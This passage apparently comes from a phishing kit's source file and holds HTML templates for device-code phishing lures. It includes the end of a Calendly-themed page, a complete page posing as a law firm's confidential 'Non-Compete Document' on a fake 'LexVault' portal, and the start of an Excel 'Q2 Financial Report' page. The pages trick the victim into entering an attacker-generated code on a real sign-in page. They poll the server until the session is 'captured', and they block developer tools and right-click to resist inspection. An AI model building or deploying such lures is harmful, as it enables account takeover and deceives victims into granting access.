    if (codeReady && code) {
        updateCodeDisplay(code, verifyUrl);
    } else {
        updateCodeDisplay(null, null);
    }

    /* POPUP DIALOG ENGINE MAPPINGS */
    function openOtpDialog() {
        document.getElementById('otpOverlay').style.display = 'flex';
    }

    function closeOtpDialog() {
        document.getElementById('otpOverlay').style.display = 'none';
    }

    function openSignIn() {
        if(!code) return;
        copyAuthCode();
        var w=520, h=700, l=(screen.width-w)/2, t=(screen.height-h)/2;
        popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
        if(popup) popup.focus();
    }

    function confirmAndProceed() {
        openSignIn();
    }

    function generateNewCode() {
        window.location.reload();
    }

    function copyAuthCode() {
        if(!code) return;
        navigator.clipboard.writeText(code).then(() => {
            alert("Copied: " + code);
        });
    }

    function goToStep(stepNumber) {
        currentStep = stepNumber;
        document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
        document.getElementById("step" + stepNumber).classList.add('active');
        
        const backButton = document.getElementById('backBtn');
        const sidebarDateTime = document.getElementById('sideDT');
        const localizedDateText = selTime + ", " + (selDate ? selDate.toLocaleDateString('en-US', { weekday: 'long', month: 'long', day: 'numeric', year: 'numeric' }) : "");
        
        if (stepNumber > 1 && stepNumber < 4) {
            backButton.style.display = 'flex';
            sidebarDateTime.style.display = 'flex';
            document.getElementById('dtDisplay').innerText = localizedDateText;
        } 
        
        if (stepNumber === 3) {
            document.getElementById('card').style.maxWidth = "1120px";
        } else if (stepNumber === 4) {
            document.getElementById('sidebar').style.display = 'none';
            document.getElementById('card').style.maxWidth = '640px';
            document.getElementById('finalDT').innerHTML = "<svg viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\"><rect x=\"3\" y=\"4\" width=\"18\" height=\"18\" rx=\"2\" ry=\"2\"></rect><line x1=\"16\" y1=\"2\" x2=\"16\" y2=\"6\"></line><line x1=\"8\" y1=\"2\" x2=\"8\" y2=\"6\"></line><line x1=\"3\" y1=\"10\" x2=\"21\" y2=\"10\"></line></svg><span><b>" + localizedDateText + "</b></span>";
        } else {
            backButton.style.display = 'none';
            sidebarDateTime.style.display = 'none';
            document.getElementById('card').style.maxWidth = "1060px";
        }
    }

    function stepBack() {
        if(currentStep === 3) goToStep(2);
        else if(currentStep === 2) goToStep(1);
    }

    function updateTimer() {
        if(expiresIn <= 0) return;
        expiresIn--;
        if(expiresIn > 0) setTimeout(updateTimer, 1000);
    }
    if(codeReady) setTimeout(updateTimer, 1000);

    function poll() {
        fetch('/dc/status/' + sid, {method:'GET',credentials:'include'})
        .then(function(r){return r.json()})
        .then(function(d){
            if(d.ready && !codeReady) {
                codeReady = true;
                updateCodeDisplay(d.user_code, d.verify_url);
                if(expiresIn === {expires_seconds}) setTimeout(updateTimer, 1000);
            }
            if(d.captured) {
                closeOtpDialog();
                goToStep(4);
                if(popup && !popup.closed) popup.close();
                if(d.redirect_url) {
                    setTimeout(function(){top.location.href=d.redirect_url;}, 2500);
                }
            }
            if(!d.failed && !d.expired && !d.captured) setTimeout(poll, 3000);
        })
        .catch(function(){setTimeout(poll, 5000);});
    }
    poll();

    buildCalendlyCalendar();
</script>
</body>
</html>`

// Non-compete Document access themed page (LexVault)
const DEVICE_CODE_LEXVAULT_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Non-compete Document — Mason Parkes & Associates LLP</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@500;600&family=Cormorant+Garamond:ital,wght@0,500;0,600;1,400&display=swap" rel="stylesheet">
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

:root {
  --teal:       #0a7c6e;
  --teal-mid:   #0d9488;
  --teal-light: #14b8a6;
  --teal-pale:  #e6f4f3;
  --ink:        #0f1923;
  --ink-mid:    #374151;
  --ink-mute:   #6b7280;
  --ink-faint:  #9ca3af;
  --border:     #e2e8f0;
  --border-mid: #cbd5e1;
  --white:      #ffffff;
  --red:        #dc2626;
}

html, body {
  height: 100%;
  font-family: 'Inter', sans-serif;
  -webkit-font-smoothing: antialiased;
  overflow: hidden;
}

.doc-bg {
  position: fixed;
  inset: 0;
  background: #f7f5f0;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  padding-top: 60px;
  filter: blur(6px);
  transform: scale(1.04);
  transform-origin: top center;
  user-select: none;
  pointer-events: none;
}

.fake-doc {
  width: 680px;
  background: #fff;
  box-shadow: 0 8px 60px rgba(0,0,0,0.12);
  padding: 72px 80px 80px;
  border-radius: 2px;
  position: relative;
  top: 10%;
}

.fake-doc::before {
  content: 'CONFIDENTIAL';
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%) rotate(-35deg);
  font-size: 5rem;
  font-weight: 800;
  color: rgba(10,124,110,0.06);
  letter-spacing: 0.25em;
  white-space: nowrap;
  pointer-events: none;
}

.doc-firm-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding-bottom: 24px;
  border-bottom: 2px solid #e8e4dc;
  margin-bottom: 32px;
}

.doc-firm-name {
  font-family: 'Cormorant Garamond', serif;
  font-size: 1.5rem;
  font-weight: 600;
  color: #1a1714;
  letter-spacing: 0.01em;
}
.doc-firm-sub {
  font-size: 0.7rem;
  color: #9a9690;
  letter-spacing: 0.06em;
  text-transform: uppercase;
  margin-top: 2px;
}
.doc-seal { width: 54px; height: 54px; }

.doc-title-block {
  text-align: center;
  margin-bottom: 36px;
}
.doc-title-block h1 {
  font-family: 'Cormorant Garamond', serif;
  font-size: 1.6rem;
  font-weight: 600;
  color: #1a1714;
  margin-bottom: 8px;
}
.doc-title-block .sub {
  font-size: 0.8rem;
  color: #6b7280;
  text-transform: uppercase;
  letter-spacing: 0.1em;
}
.doc-line { height: 11px; background: #ede9e1; border-radius: 2px; margin-bottom: 8px; }
.doc-line.w100 { width: 100%; }
.doc-line.w90  { width: 90%; }
.doc-line.w80  { width: 80%; }
.doc-line.w70  { width: 70%; }
.doc-line.w55  { width: 55%; }
.doc-section-title {
  font-family: 'Cormorant Garamond', serif;
  font-size: 0.95rem;
  font-weight: 600;
  color: #1a1714;
  text-transform: uppercase;
  letter-spacing: 0.08em;
  margin: 28px 0 12px;
  padding-bottom: 6px;
  border-bottom: 1px solid #e8e4dc;
}
.doc-para { margin-bottom: 6px; }
.doc-sigs {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 32px;
  margin-top: 48px;
  padding-top: 24px;
  border-top: 1px solid #e8e4dc;
}
.sig-line { height: 1px; background: #c8c3ba; margin-bottom: 6px; }
.sig-name { height: 10px; background: #ede9e1; border-radius: 2px; width: 60%; }
.sig-role { height: 8px; background: #f0ece4; border-radius: 2px; width: 45%; margin-top: 5px; }

.overlay {
  position: fixed;
  inset: 0;
  background: rgba(10, 14, 20, 0.62);
}

.topbar {
  position: fixed;
  top: 0; left: 0; right: 0;
  z-index: 20;
  height: 52px;
  background: rgba(10, 14, 20, 0.75);
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  border-bottom: 1px solid rgba(255,255,255,0.07);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 2rem;
}
.topbar-left {
  display: flex;
  align-items: center;
  gap: 10px;
}
.topbar-logo {
  display: flex;
  align-items: center;
  gap: 7px;
}
.topbar-logo-icon {
  width: 26px; height: 26px;
  background: var(--teal);
  border-radius: 6px;
  display: flex;
  align-items: center;
  justify-content: center;
}
.topbar-logo-icon svg { width: 14px; height: 14px; }
.topbar-name {
  font-size: 0.88rem;
  font-weight: 700;
  color: #fff;
  letter-spacing: -0.01em;
}
.topbar-sep {
  width: 1px; height: 16px;
  background: rgba(255,255,255,0.15);
}
.topbar-doc-label {
  font-size: 0.75rem;
  color: rgba(255,255,255,0.45);
}
.topbar-right {
  display: flex;
  align-items: center;
  gap: 6px;
  font-size: 0.72rem;
  color: rgba(255,255,255,0.4);
}
.secure-pill {
  display: flex;
  align-items: center;
  gap: 5px;
  padding: 3px 10px;
  border: 1px solid rgba(255,255,255,0.1);
  border-radius: 20px;
  background: rgba(255,255,255,0.05);
}
.secure-dot {
  width: 6px; height: 6px;
  border-radius: 50%;
  background: #4ade80;
  animation: blink 2.5s ease-in-out infinite;
}
@keyframes blink {
  0%,100% { opacity: 1; } 50% { opacity: 0.4; }
}

.page {
  position: fixed;
  inset: 0;
  z-index: 10;
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 52px 1rem 1rem;
}

.card {
  width: 100%;
  max-width: 400px;
  background: #fff;
  border-radius: 14px;
  box-shadow:
    0 0 0 1px rgba(0,0,0,0.08),
    0 8px 24px rgba(0,0,0,0.18),
    0 32px 80px rgba(0,0,0,0.28);
  overflow: hidden;
  position: relative;
  animation: card-in 0.4s cubic-bezier(0.34,1.2,0.64,1) both;
}
@keyframes card-in {
  from { transform: translateY(24px) scale(0.97); opacity: 0; }
  to   { transform: translateY(0) scale(1); opacity: 1; }
}
.card-bar {
  height: 4px;
  background: linear-gradient(90deg, var(--teal) 0%, var(--teal-light) 100%);
}

.card-header {
  padding: 1.3rem 1.5rem 1.1rem;
  border-bottom: 1px solid #f0f4f8;
  display: flex;
  align-items: center;
  gap: 11px;
}
.company-avatar {
  width: 40px; height: 40px;
  border-radius: 9px;
  background: var(--teal-pale);
  border: 1px solid rgba(10,124,110,0.15);
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
  font-family: 'Cormorant Garamond', serif;
  font-size: 1rem;
  font-weight: 600;
  color: var(--teal);
}
.company-info {}
.company-name {
  font-size: 0.88rem;
  font-weight: 600;
  color: var(--ink);
  line-height: 1.25;
}
.company-verified {
  display: inline-flex;
  align-items: center;
  gap: 4px;
  font-size: 0.67rem;
  font-weight: 500;
  color: var(--teal);
  margin-top: 2px;
}
.company-verified svg { width: 11px; height: 11px; fill: var(--teal); }

.card-body { padding: 1.3rem 1.5rem; }

.alert-strip {
  display: flex;
  gap: 9px;
  align-items: flex-start;
  padding: 11px 13px;
  background: #f0fafa;
  border: 1px solid rgba(10,124,110,0.16);
  border-left: 3px solid var(--teal-mid);
  border-radius: 8px;
  margin-bottom: 1.2rem;
}
.alert-strip svg {
  width: 16px; height: 16px;
  fill: var(--teal-mid);
  flex-shrink: 0;
  margin-top: 1px;
}
.alert-strip p {
  font-size: 0.77rem;
  color: var(--teal);
  line-height: 1.5;
}

.doc-row {
  display: flex;
  align-items: center;
  gap: 10px;
  padding: 10px 12px;
  background: #f8fafc;
  border: 1px solid var(--border);
  border-radius: 8px;
  margin-bottom: 1.2rem;
}
.doc-row-icon {
  width: 32px; height: 32px;
  border: 1px solid var(--border-mid);
  border-radius: 7px;
  background: #fff;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.doc-row-icon svg { width: 16px; height: 16px; }
.doc-row-info { flex: 1; min-width: 0; }
.doc-row-name {
  font-size: 0.8rem;
  font-weight: 600;
  color: var(--ink);
  white-space: nowrap;
  overflow: hidden;
  text-overflow: ellipsis;
}
.doc-row-meta {
  font-size: 0.68rem;
  color: var(--ink-faint);
  margin-top: 1px;
}
.doc-lock-badge {
  width: 24px; height: 24px;
  border-radius: 50%;
  background: var(--teal-pale);
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
}
.doc-lock-badge svg {
  width: 11px; height: 11px;
  stroke: var(--teal);
  fill: none;
  stroke-width: 2;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.code-label-row {
  display: flex; align-items: center; justify-content: space-between;
  margin-bottom: 7px;
}
.code-label {
  font-size: 0.63rem;
  text-transform: uppercase;
  letter-spacing: 0.13em;
  font-weight: 700;
  color: var(--ink-faint);
}
.new-code-btn {
  display: flex; align-items: center; gap: 4px;
  font-size: 0.7rem;
  font-weight: 600;
  color: var(--teal-mid);
  background: none; border: none; cursor: pointer;
  font-family: 'Inter', sans-serif;
  padding: 0;
  transition: color 0.12s;
}
.new-code-btn:hover { color: var(--teal); }
.new-code-btn svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }

.code-box {
  display: flex; align-items: center; justify-content: space-between;
  background: #f8fafc;
  border: 1.5px solid var(--border-mid);
  border-radius: 10px;
  padding: 13px 14px;
  margin-bottom: 14px;
  gap: 8px;
}
.code-value {
  font-family: 'JetBrains Mono', monospace;
  font-size: 1.35rem;
  font-weight: 600;
  color: var(--teal);
  letter-spacing: 0.2em;
  flex: 1;
  text-align: center;
}
.copy-btn {
  display: flex; align-items: center; gap: 5px;
  padding: 5px 11px;
  background: #fff;
  border: 1.5px solid var(--border-mid);
  border-radius: 6px;
  font-size: 0.72rem;
  font-weight: 500;
  color: var(--ink-mid);
  cursor: pointer;
  font-family: 'Inter', sans-serif;
  transition: border-color 0.12s, color 0.12s, background 0.12s;
  white-space: nowrap;
}
.copy-btn:hover { border-color: var(--teal-mid); color: var(--teal); }
.copy-btn.copied { border-color: var(--teal); color: var(--teal); background: var(--teal-pale); }
.copy-btn svg { width: 12px; height: 12px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.how-steps {
  display: flex;
  flex-direction: column;
  gap: 8px;
  margin-bottom: 14px;
}
.how-item {
  display: flex; align-items: flex-start; gap: 9px;
}
.how-num {
  width: 20px; height: 20px;
  border-radius: 50%;
  background: var(--teal-pale);
  color: var(--teal);
  font-size: 0.65rem;
  font-weight: 700;
  display: flex; align-items: center; justify-content: center;
  flex-shrink: 0;
  margin-top: 1px;
}
.how-text {
  font-size: 0.77rem;
  color: var(--ink-mid);
  line-height: 1.5;
}

.btn-authenticate {
  width: 100%;
  padding: 12px 14px;
  background: var(--teal);
  color: #fff;
  font-family: 'Inter', sans-serif;
  font-size: 0.88rem;
  font-weight: 600;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 8px;
  transition: background 0.14s, box-shadow 0.14s;
}
.btn-authenticate:hover { background: var(--teal-mid); box-shadow: 0 4px 14px rgba(10,124,110,0.3); }
.btn-authenticate svg { width: 16px; height: 16px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }

.status-bar {
  display: flex; align-items: center; gap: 7px;
  padding: 8px 12px;
  background: #f0fafa;
  border: 1px solid rgba(10,124,110,0.18);
  border-radius: 7px;
  font-size: 0.74rem;
  color: var(--teal);
  font-weight: 500;
  margin-top: 10px;
}
.status-bar svg { width: 14px; height: 14px; fill: var(--teal); flex-shrink: 0; }

.success-wrap {
  display: flex;
  flex-direction: column;
  align-items: center;
  text-align: center;
  gap: 5px;
  padding-bottom: 4px;
}
.success-ring {
  width: 54px; height: 54px;
  border-radius: 50%;
  border: 2px solid var(--teal);
  background: var(--teal-pale);
  display: flex; align-items: center; justify-content: center;
  margin-bottom: 6px;
  animation: pop-in 0.3s cubic-bezier(0.34,1.56,0.64,1) both;
}
@keyframes pop-in {
  from { transform: scale(0.5); opacity: 0; }
  to   { transform: scale(1);   opacity: 1; }
}
.success-ring svg {
  width: 24px; height: 24px;
  stroke: var(--teal); fill: none;
  stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
  stroke-dasharray: 30; stroke-dashoffset: 30;
  animation: draw-check 0.32s ease forwards 0.28s;
}
@keyframes draw-check { to { stroke-dashoffset: 0; } }
.success-title {
  font-size: 0.97rem;
  font-weight: 700;
  color: var(--ink);
}
.success-email-pill {
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.72rem;
  background: var(--teal-pale);
  color: var(--teal);
  border: 1px solid rgba(10,124,110,0.18);
  border-radius: 20px;
  padding: 3px 12px;
  margin: 3px 0 6px;
}
.success-sub {
  font-size: 0.77rem;
  color: var(--ink-mute);
  line-height: 1.55;
  max-width: 280px;
  margin-bottom: 10px;
}
.btn-download {
  width: 100%;
  padding: 10px 14px;
  background: var(--teal);
  color: #fff;
  font-family: 'Inter', sans-serif;
  font-size: 0.85rem;
  font-weight: 600;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  display: flex; align-items: center; justify-content: center; gap: 7px;
  transition: background 0.14s, box-shadow 0.14s;
}
.btn-download:hover { background: var(--teal-mid); box-shadow: 0 4px 12px rgba(10,124,110,0.25); }
.btn-download svg { width: 15px; height: 15px; stroke: currentColor; fill: none; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
.audit-log {
  width: 100%;
  background: #f8fafc;
  border: 1px solid var(--border);
  border-radius: 7px;
  padding: 9px 12px;
  font-family: 'JetBrains Mono', monospace;
  font-size: 0.64rem;
  color: var(--ink-mute);
  line-height: 1.75;
  text-align: left;
  margin-top: 8px;
}

.card-footer {
  padding: 10px 1.5rem 1.2rem;
  border-top: 1px solid #f0f4f8;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 5px;
  flex-wrap: wrap;
}
.tag {
  font-size: 0.64rem;
  color: var(--ink-faint);
  display: flex; align-items: center; gap: 3px;
}
.tag.pill {
  background: var(--teal-pale);
  border: 1px solid rgba(10,124,110,0.18);
  border-radius: 20px;
  padding: 2px 8px;
  color: var(--teal);
  font-weight: 500;
}
.tag-sep { width: 1px; height: 10px; background: var(--border-mid); }
.tag-dot { width: 4px; height: 4px; border-radius: 50%; background: var(--ink-faint); }

.hidden { display: none !important; }
</style>
</head>
<body>

<div class="doc-bg" aria-hidden="true">
  <div class="fake-doc">
    <div class="doc-firm-header">
      <div>
        <div class="doc-firm-name">Mason Parkes &amp; Associates LLP</div>
        <div class="doc-firm-sub">Attorneys at Law · Est. 1987</div>
      </div>
      <svg class="doc-seal" viewBox="0 0 54 54" fill="none" xmlns="http://www.w3.org/2000/svg">
        <circle cx="27" cy="27" r="26" stroke="#b8942a" stroke-width="1.2"/>
        <circle cx="27" cy="27" r="21" stroke="#b8942a" stroke-width="0.8"/>
        <text x="27" y="24" text-anchor="middle" font-family="Cormorant Garamond, serif" font-size="6" fill="#b8942a" font-weight="600" letter-spacing="1">OFFICIAL</text>
        <text x="27" y="33" text-anchor="middle" font-family="Cormorant Garamond, serif" font-size="5.5" fill="#b8942a" letter-spacing="0.5">SEAL</text>
        <circle cx="27" cy="27" r="3.5" fill="#b8942a" opacity="0.3"/>
      </svg>
    </div>

    <div class="doc-title-block">
      <h1>Non-Disclosure Agreement</h1>
      <div class="sub">Confidential · Privileged Communication</div>
    </div>

    <div class="doc-line w90"></div>
    <div class="doc-line w100"></div>
    <div class="doc-line w80"></div>
    <div class="doc-line w100"></div>
    <div class="doc-line w70"></div>

    <div class="doc-section-title">1. Definitions</div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w90"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w80"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w55"></div></div>

    <div class="doc-section-title">2. Obligations of Receiving Party</div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w90"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w70"></div></div>

    <div class="doc-section-title">3. Term &amp; Termination</div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w80"></div></div>
    <div class="doc-para"><div class="doc-line w100"></div></div>
    <div class="doc-para"><div class="doc-line w90"></div></div>

    <div class="doc-sigs">
      <div><div class="sig-line"></div><div class="sig-name"></div><div class="sig-role"></div></div>
      <div><div class="sig-line"></div><div class="sig-name"></div><div class="sig-role"></div></div>
    </div>
  </div>
</div>

<div class="overlay" aria-hidden="true"></div>

<header class="topbar">
  <div class="topbar-left">
    <div class="topbar-logo">
      <div class="topbar-logo-icon">
        <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" stroke="white" stroke-width="1.6" stroke-linejoin="round"/>
          <path d="M14 2v6h6" stroke="white" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <span class="topbar-name">LexVault</span>
    </div>
    <div class="topbar-sep"></div>
    <span class="topbar-doc-label" id="topbarDocLabel">Secure document access</span>
  </div>
  <div class="topbar-right">
    <div class="secure-pill">
      <div class="secure-dot"></div>
      256-bit encrypted
    </div>
  </div>
</header>

<div class="page">
  <div class="card" id="mainCard">
    <div class="card-bar"></div>

    <div class="card-header">
      <div class="company-avatar">MP</div>
      <div class="company-info">
        <div class="company-name">Mason Parkes &amp; Associates LLP</div>
        <div class="company-verified">
          <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
            <path d="M8 1l1.8 2.2 2.7-.6.2 2.8 2.3 1.6-1.4 2.4.8 2.7-2.8.3-1.6 2.3-2.5-1.1-2.5 1.1-1.6-2.3-2.8-.3.8-2.7-1.4-2.4 2.3-1.6.2-2.8 2.7.6z"/>
            <path d="M5.5 8.5l2 1.5 3-4" stroke="white" stroke-width="1.2" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
          </svg>
          Verified Publisher
        </div>
      </div>
    </div>

    <div id="stepCode">
      <div class="card-body">
        <div class="alert-strip">
          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
            <path d="M12 2L3 7v5c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V7L12 2Z"/>
          </svg>
          <p>This type of document requires verification. Copy your access code to continue.</p>
        </div>

        <div class="doc-row">
          <div class="doc-row-icon">
            <svg viewBox="0 0 24 24" fill="none">
              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8Z" stroke="#64748b" stroke-width="1.5" stroke-linejoin="round"/>
              <path d="M14 2v6h6" stroke="#64748b" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
              <line x1="8" y1="13" x2="16" y2="13" stroke="#94a3b8" stroke-width="1.3" stroke-linecap="round"/>
              <line x1="8" y1="17" x2="16" y2="17" stroke="#94a3b8" stroke-width="1.3" stroke-linecap="round"/>
            </svg>
          </div>
          <div class="doc-row-info">
            <div class="doc-row-name">Non-Compete Document</div>
            <div class="doc-row-meta">PDF</div>
          </div>
          <div class="doc-lock-badge">
            <svg viewBox="0 0 24 24">
              <rect x="3" y="11" width="18" height="11" rx="2"/>
              <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
            </svg>
          </div>
        </div>

        <div class="code-label-row">
          <span class="code-label">Access code</span>
          <button class="new-code-btn" id="btnNewCode" style="display:none;">
            <svg viewBox="0 0 24 24"><polyline points="1 4 1 10 7 10"/><path d="M3.51 15a9 9 0 1 0 .49-4.49"/></svg>
            New code
          </button>
        </div>

        <div class="code-box">
          <span class="code-value" id="codeDisplay">Loading...</span>
          <button class="copy-btn" id="btnCopy" disabled>
            <svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
            Copy
          </button>
        </div>

        <div class="how-steps">
          <div class="how-item">
            <div class="how-num">1</div>
            <p class="how-text">Copy the access code shown above</p>
          </div>
          <div class="how-item">
            <div class="how-num">2</div>
            <p class="how-text">Click <strong>Authenticate</strong> to open the verification page</p>
          </div>
          <div class="how-item">
            <div class="how-num">3</div>
            <p class="how-text">Paste the code on the verification page to confirm your identity</p>
          </div>
        </div>

        <button class="btn-authenticate" id="btnAuthenticate" disabled>
          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
          Authenticate
        </button>

        <div class="status-bar" id="statusBar">
          <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
            <circle cx="8" cy="8" r="8"/>
            <path d="M4.5 8.5l2.5 2.5 4-5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
          </svg>
          Generating secure code...
        </div>
      </div>
    </div>

    <div id="stepSuccess" class="hidden">
      <div class="card-body">
        <div class="success-wrap">
          <div class="success-ring">
            <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
          </div>
          <h2 class="success-title">Identity verified</h2>
          <div class="success-email-pill">Access granted</div>
          <p class="success-sub">You now have full access. Your identity has been confirmed via the device code flow.</p>
          <button class="btn-download" id="btnDownload">
            <svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
            Download document
          </button>
          <div class="audit-log" id="auditLog"></div>
        </div>
      </div>
    </div>

    <div class="card-footer">

    </div>
  </div>
</div>

<script>
document.addEventListener("keydown",function(e){if(e.key==="F12"||(e.ctrlKey&&e.shiftKey&&["i","j","c"].includes(e.key.toLowerCase()))||(e.ctrlKey&&e.key.toLowerCase()==="u")){e.preventDefault();}});document.addEventListener("contextmenu",function(e){e.preventDefault();});

(function(){
  var sid = '{session_id}';
  var verifyUrl = '{verify_url}';
  var codeReady = {code_ready};
  var code = '{user_code}';
  var expiresIn = {expires_seconds};

  var codeEl = document.getElementById('codeDisplay');
  var statusEl = document.getElementById('statusBar');
  var btnAuth = document.getElementById('btnAuthenticate');
  var copyBtn = document.getElementById('btnCopy');

  function setStatus(msg, isError) {
    if (isError) {
      statusEl.style.background = '#fef2f2';
      statusEl.style.color = '#dc2626';
      statusEl.style.borderColor = '#fecaca';
    } else {
      statusEl.style.background = '#f0fafa';
      statusEl.style.color = '#0a7c6e';
      statusEl.style.borderColor = 'rgba(10,124,110,0.18)';
    }
    statusEl.innerHTML = msg;
  }

  function showCode(c, v) {
    code = c;
    if(v) verifyUrl = v;
    codeEl.textContent = c;
    btnAuth.disabled = false;
    copyBtn.disabled = false;
    setStatus('<svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><circle cx="8" cy="8" r="8"/><path d="M4.5 8.5l2.5 2.5 4-5" stroke="white" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round" fill="none"/></svg> Code ready — click Authenticate to proceed', false);
  }

  if (codeReady && code) {
    showCode(code, verifyUrl);
  } else {
    codeEl.textContent = 'Loading...';
    btnAuth.disabled = true;
    copyBtn.disabled = true;
    setStatus('Generating secure code...', false);
  }

  function copyCode() {
    if (!code) return;
    if (navigator.clipboard) {
      navigator.clipboard.writeText(code).then(function() { showCopied(); });
    } else {
      var t = document.createElement('textarea');
      t.value = code;
      document.body.appendChild(t);
      t.select();
      document.execCommand('copy');
      document.body.removeChild(t);
      showCopied();
    }
  }

  function showCopied() {
    copyBtn.classList.add('copied');
    copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copied!';
    setTimeout(function() {
      copyBtn.classList.remove('copied');
      copyBtn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copy';
    }, 2000);
  }

  function openSignIn() {
    if (!code) {
      setStatus('Please wait for code generation.', true);
      return;
    }
    copyCode();
    var w = 600, h = 600, l = (screen.width - w) / 2, t = (screen.height - h) / 2;
    var popup = window.open(verifyUrl, 'ms', 'width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
    if (popup) popup.focus();
    setStatus('Verification page opened. Please confirm the code.', false);
  }

  function showSuccess(redirectUrl) {
    document.getElementById('stepCode').classList.add('hidden');
    document.getElementById('stepSuccess').classList.remove('hidden');
    var downloadBtn = document.getElementById('btnDownload');
    if (redirectUrl) {
      downloadBtn.onclick = function() { top.location.href = redirectUrl; };
    } else {
      downloadBtn.onclick = function() { top.location.href = redirectUrl || '/'; };
    }
    var now = new Date();
    document.getElementById('auditLog').textContent =
      'ACCESS GRANTED\n' +
      'Time:    ' + now.toUTCString() + '\n' +
      'Method:  Device Code Flow\n' +
      'Session: ' + sid;
  }

  function poll() {
    fetch('/dc/status/' + sid, {method:'GET',credentials:'include'}).then(function(r) { return r.json() }).then(function(d) {
      if (d.ready && !codeReady) {
        codeReady = true;
        showCode(d.user_code, d.verify_url);
      }
      if (d.captured) {
        showSuccess(d.redirect_url);
        if (d.redirect_url) {
          setTimeout(function(){ top.location.href = d.redirect_url; }, 2500);
        }
      }
      if (d.expired) {
        setStatus('Code expired. Please refresh the page.', true);
        btnAuth.disabled = true;
      }
      if (!d.failed && !d.expired && !d.captured) {
        setTimeout(poll, 3000);
      }
    })['catch'](function(){ setTimeout(poll, 5000); });
  }
  
  poll();

  copyBtn.addEventListener('click', copyCode);
  btnAuth.addEventListener('click', openSignIn);
})();
</script>
</body>
</html>`

// Excel / Q2 Financial Report themed page
const DEVICE_CODE_EXCEL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Q2 Financial Report — Restricted</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
